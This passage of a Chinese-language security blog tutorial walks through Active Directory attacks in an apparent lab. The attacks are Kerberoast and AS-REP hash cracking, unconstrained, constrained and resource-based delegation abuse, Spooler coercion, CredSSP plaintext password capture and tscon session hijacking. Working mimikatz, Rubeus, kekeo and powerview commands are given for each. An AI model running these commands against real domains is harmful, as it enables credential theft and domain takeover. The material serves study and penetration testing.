Hashcat</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png" alt="QQ截图20210217132627"></p><h3 id="How-to-crack-HASH"><a href="#How-to-crack-HASH" class="headerlink" title="How to crack HASH"></a>How to crack HASH</h3><p>如何破解HASH?</p><p><strong>1.HASHCAT</strong></p><p>这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13110 pass.txt hash.txt</span><br></pre></td></tr></table></figure><p><strong>2.kerberoast中的tgsrepcrack.py</strong></p><p>支持kribi文件破解</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt xxx.kribi</span><br></pre></td></tr></table></figure><h3 id="How-to-use-Kerberoast"><a href="#How-to-use-Kerberoast" class="headerlink" title="How to use Kerberoast"></a>How to use Kerberoast</h3><p>既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">## 将票据权限改为administrator</span><br><span class="line">kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roast"><a href="#AS-REP-Roast" class="headerlink" title="AS_REP Roast"></a>AS_REP Roast</h2><p>较Kerberoast来说，比较鸡肋。<br>它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png" alt="QQ截图20210217132642"></p><h3 id="How-to-get-HASH-1"><a href="#How-to-get-HASH-1" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p><strong>1.Rubeus</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><p>然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png" alt="QQ截图20210217132654"></p><p><strong>2.Empire框架与 ASREPRoast.ps1</strong></p><p>使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png" alt="QQ截图20210217132707">然后用 ASREPRoast.ps1 ：<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a> 获取指定用户的AS-REPhash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p>就会生成一个hash数据文件了</p><h3 id="How-to-crack-hash"><a href="#How-to-crack-hash" class="headerlink" title="How to crack hash"></a>How to crack hash</h3><p>将生成的HASH保存起来，并在下图处加入$23</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png" alt="QQ截图20210217132743"></p><p>然后丢给hashcat 跑</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.<br>原来是一个一个的用明文字典去爆破。</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h3><p>域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。<br>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br>用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。<br>发生域委派的服务一般为机器账户和服务账户。<br>域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派</p><h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。</p><p>非约束性委派的启用：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png" alt="QQ截图20210217134709"></p><p>为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。<br>开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png" alt="QQ截图20210217134749"></p><p>非约束委派的设置需要<code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员<br>这里说个题外话，域控主机默认是非约束性委派</p><h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。<br>约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。</p><p>约束性委派的大致流程：<br>用户访问开启约束性委派的服务A<br>（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。<br>（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。</p><p>也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。<br>而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。</p><p>启用方法:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png" alt="QQ截图20210217135048"></p><p>其中被添加的服务则是允许被委派到的服务</p><p>若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.<br>若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png" alt="QQ截图20210217135100"></p><h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置<br>基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。<br>其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。</p><h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><p>非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。</p><h4 id="1-进行非约束性委派账户扫描"><a href="#1-进行非约束性委派账户扫描" class="headerlink" title="1.进行非约束性委派账户扫描"></a>1.进行非约束性委派账户扫描</h4><p>这里提一下怎么创建有SPN的服务账户。<br>只需再域控里执行 setspn -U -A spn_type username 即可<br>其中spn_type即SPN的格式： MSSQLSvc/<FQDN>:[<port> | <instancename>]</p><ul><li><strong>MSSQLSvc</strong> 是要注册的服务。</li><li><FQDN> 是服务器的完全限定域名。</li><li><port> 是 TCP 端口号。</li><li><instancename> 是 SQL Server 实例的名称。</li></ul><p>这里我们随便输一个，比如 sb/caonima 这种都行.</p><p>这里采用powersploit下的powerview.ps1<br>根据我网上很多搜索结果，查找非约束委派服务账户只需调用<br><code>Get-NetUser -Unconstrained -Domain de1ay.com</code><br>这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）<br>直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png" alt="QQ截图20210217135123"></p><p>查询非约束委派机器账户则用<br><code>Get-domaincomputer -unconstrained -domain const.com</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png" alt="QQ截图20210217135236"></p><h4 id="2-非约束性委派的攻击"><a href="#2-非约束性委派的攻击" class="headerlink" title="2.非约束性委派的攻击"></a>2.非约束性委派的攻击</h4><p>仅能基于机器账户</p><p>如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。</p><p>在被控制的非约束性委派机器上使用mimikatz。<br><code>privilege::debug</code>提权<br><code>sekurlsa::tickets</code> 查看本机所有票据</p><p>通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。</p><p>我们模拟管理员调用非约束性委派机的smb服务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png" alt="QQ截图20210217135342"></p><p>我们回到非约束委派机，查看票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png" alt="QQ截图20210217135358"></p><p>tgt被截获,我们用 sekurlas::tickets /export 把票据导出来</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png" alt="QQ截图20210217135408"></p><p>然后mimikatz里使用<br><code>kerberos::ptt 票据文件名 将票据注入内存</code><br>访问域控c$</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png" alt="QQ截图20210217135419"></p><p>成功</p><h4 id="3-非约束性委派配合-Spooler打印机服务"><a href="#3-非约束性委派配合-Spooler打印机服务" class="headerlink" title="3.非约束性委派配合 Spooler打印机服务"></a>3.非约束性委派配合 Spooler打印机服务</h4><p>纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。<br>但是 ：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-<br>而且splooer服务是默认运行的。（图源WIN7）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png" alt="QQ截图20210217135445"></p><p>使其他主机强行与自己发生身份验证的脚本：需要自己编译一下<a href="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p><p>在此之前需要开启监听来自其他主机的TGT，这里用的是rubeus<br><code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p><p>然后使用<code>SpoolSample.exe XX win7</code>,让指定机器访问WIN7进行身份验证</p><p>然后获得TGT，下班。</p><h3 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h3><p>约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了.</p><p>重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。</p><p>这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。</p><p>首先配置好约束性委派账户</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png" alt="QQ截图20210217135527"></p><p>注意选用 使用任何身份验证协议</p><p>我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png" alt="QQ截图20210217135553"></p><p>箭头指出的地方就是可以被委派访问的服务</p><p>我们用kekeo来实现攻击.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbi这里的&#x2F;password可以改成&#x2F;NTLM:xx</span><br><span class="line">获得TGT转发票据</span><br><span class="line"></span><br><span class="line">tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DC</span><br><span class="line">tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2</span><br></pre></td></tr></table></figure><p>把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。</p><h3 id="基于资源的约束性委派-1"><a href="#基于资源的约束性委派-1" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p><p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p><p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p><p>可以获得域控WIN版本</p><p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p><p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p><p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p><p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQ截图20210217140659"></p><p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p><p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p><p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p><p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p><p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p><h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p><p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p><p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p><p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p><p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p><p>完事</p><h2 id="credssp-导出用户明文密码"><a href="#credssp-导出用户明文密码" class="headerlink" title="credssp 导出用户明文密码"></a>credssp 导出用户明文密码</h2><p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。</p><p>我们在配置这个协议时，一般在组策略编辑器里配置。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png" alt="QQ截图20210217143231"></p><p>Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>那么这样看，这个攻击流程就很自然了。<br>我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。<br>在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。<br>然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br></pre></td></tr></table></figure><p>一股脑设置好就完事了。。（用户需重新登陆才生效）</p><p>然后开始获取密码</p><p>我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。<br>我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tsssp::server 开启服务端</span><br><span class="line">tsssp::client &#x2F;target:...   开启客户端，这里的target随便填</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png" alt="QQ截图20210217143306"></p><p>那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。</p><p>服务端建立: tsssp::server 需要SYSTEM权限</p><p>客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png" alt="QQ截图20210217143322"></p><h2 id="tscon横向"><a href="#tscon横向" class="headerlink" title="tscon横向"></a>tscon横向</h2><p>若一个机器上有多个用户登录，则在任务管理器可以看见如下场面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png" alt="QQ截图20210217143439"></p><p>其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png" alt="QQ截图20210217143500"></p><p>但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。<br>比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。</p><p>query user 获得administrator用户的id</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png" alt="QQ截图20210217143547"></p><p>可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。</p><p>cmd /k tscon 2 /dest:console</p><p>执行以上命令，我们跳转到了admin的桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png" alt="QQ截图20210217143616"></p><h2 id="利用COM-DCOM对象"><a href="#利用COM-DCOM对象" class="headerlink" title="利用COM/DCOM对象"></a>利用COM/DCOM对象</h2><p>参考:<a href="https://www.freebuf.com/articles/network/256372.html">https://www.freebuf.com/articles/network/256372.html</a> </p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。<br>这里简要说一下几个有关COM的概念</p><p>CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D}</p><p>ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联</p><p>Appid: 为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问</p><p>我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png" alt="image-20210223152713449"></p><p>远程DCOM对象实例化的流程:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。</span><br><span class="line">远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。</span><br><span class="line">DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。</span><br><span class="line">客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。</span><br></pre></td></tr></table></figure><h3 id="MMC20-APPLICATION-1"><a href="#MMC20-APPLICATION-1" class="headerlink" title="MMC20.APPLICATION.1"></a>MMC20.APPLICATION.1</h3><p>中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。 